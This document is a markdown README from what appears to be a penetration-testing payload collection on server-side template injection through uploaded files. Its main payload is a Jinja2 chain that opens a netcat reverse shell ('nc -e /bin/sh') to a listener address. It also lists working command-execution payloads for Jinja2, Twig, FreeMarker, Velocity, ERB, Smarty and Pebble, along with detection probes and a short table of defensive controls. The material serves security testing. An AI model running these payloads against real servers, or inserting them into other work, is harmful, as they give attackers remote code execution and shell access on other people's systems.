# SSTI Payloads

Payloads for testing **Server-Side Template Injection via file upload**. These test whether an application renders the content of an uploaded file through a template engine, allowing injected template syntax to execute on the server.

---

## Attack Surface

SSTI via upload occurs when:
- An uploaded file's content is passed to a template engine's `render()` call rather than being read and stored as-is
- A filename or metadata field is rendered through a template (see [`../File Name Injection/`](../File%20Name%20Injection/))
- A document generation feature (PDF reports, email templates, invoice builders) renders user-supplied file content as a template
- A preview or dry-run feature evaluates uploaded template files

---

## Payload Index

### Jinja2 / Flask — `request.application` Globals Chain

**File:** `request.jinja`

```
{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}
```

**Engine:** Jinja2 (Python) — used by Flask, Django (optional), Ansible, Salt, and others.

**Chain breakdown:**

| Step | Value |
|---|---|
| `request.application` | The Flask/WSGI application object, accessible from the Jinja2 request context |
| `.__globals__` | The global namespace of the function — contains Python builtins |
| `.__builtins__` | The `builtins` module (or dict) — provides access to `__import__` |
| `.__import__('os')` | Import the `os` module |
| `.popen('...')` | Execute a shell command and return a file-like object |
| `.read()` | Read and return the command output into the rendered output |

**Payload command:** `nc -e /bin/sh 192.168.1.2 443` — reverse shell via netcat. Replace `192.168.1.2` and `443` with your listener address.

**Prerequisites:**
- The Jinja2 environment must not have `request` sandboxed out of the template context
- `SandboxedEnvironment` is **not** in use (standard Flask uses the unsandboxed `Environment`)
- The server process has `nc` with `-e` support, or substitute an alternative reverse shell

---

## Detection Payloads

Before attempting RCE, confirm template injection is present with non-destructive probes. These work across multiple engines:

| Probe | Expected output | Engines |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Pebble, Tornado |
| `${7*7}` | `49` | FreeMarker, Velocity, Thymeleaf (expression mode) |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node.js), ASP |
| `#{7*7}` | `49` | Ruby string interpolation, Pebble |
| `*{7*7}` | `49` | Thymeleaf (`*{...}` selection syntax) |
| `{{7*'7'}}` | `7777777` | Jinja2 (string multiplication — distinguishes Jinja2 from Twig which outputs `49`) |
| `${{7*7}}` | `49` | Jinja2 with `${}` prefix (some configs) |

---

## Engine Identification

If `{{7*7}}` renders as `49`:

```
{{7*'7'}}
```
- Outputs `7777777` → **Jinja2** (Python string × int)
- Outputs `49` → **Twig** (PHP) or **Pebble** (Java)

If `${7*7}` renders as `49`:
- Likely **FreeMarker**, **Velocity**, or **Thymeleaf**

---

## Additional Jinja2 RCE Chains

Alternative chains for when `request` is not available in the template context:

**Via `__class__` MRO traversal (no `request` needed):**
```
{{''.__class__.__mro__[1].__subclasses__()[<N>]('id',shell=True,stdout=-1).communicate()}}
```
Find `N` by locating `subprocess.Popen` in the subclasses list.

**Via `config` object (Flask):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Via `lipsum` builtin (Jinja2 globals):**
```
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Via `cycler` builtin:**
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

---

## Other Engines — Quick Reference

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### FreeMarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```
#set($e="")
#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class))
#set($o=$x.invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))
```

### ERB (Ruby)
```
<%= `id` %>
```

### Smarty (PHP)
```
{system('id')}
```

### Pebble (Java)
```
{% for i in range(0,1) %}{{ i.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(i.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}{% endfor %}
```

---

## What to Test For

| Control | Passes if… |
|---|---|
| File content stored, not rendered | Uploaded file bytes are saved to storage and served back verbatim — template syntax is never evaluated |
| Sandboxed environment | Jinja2 `SandboxedEnvironment` is used; access to `__globals__`, `__builtins__`, `__class__` raises `SecurityError` |
| Template allowlist | Only pre-approved template files from a trusted source are rendered; user uploads are never passed to `render()` |
| Output encoding | Template output is HTML-escaped before being included in responses, limiting exfiltration to the response body |

---

## Related Sections

- [`../File Name Injection/`](../File%20Name%20Injection/) — SSTI via filename fields rendered server-side
- [`../Formula Injection/`](../Formula%20Injection/) — Analogous injection into spreadsheet template engines
